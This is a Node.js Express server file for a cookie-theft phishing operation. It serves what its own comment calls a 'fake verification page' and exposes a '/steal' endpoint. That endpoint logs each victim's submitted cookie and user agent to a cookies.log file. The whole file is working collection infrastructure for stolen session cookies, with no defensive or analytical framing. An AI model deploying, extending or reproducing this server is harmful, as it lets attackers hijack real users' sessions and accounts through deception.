const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');

app.use(express.json());

// Log directory
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir);

// Serve the main fake verification page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API endpoint to receive the cookie
app.post('/steal', (req, res) => {
    const { cookie, userAgent } = req.body;
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] UA: ${userAgent} | Cookie: ${cookie}\n`;
    
    fs.appendFile(path.join(logsDir, 'cookies.log'), logEntry, (err) => {
        if (err) console.error(err);
    });

    res.json({ status: 'ok' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
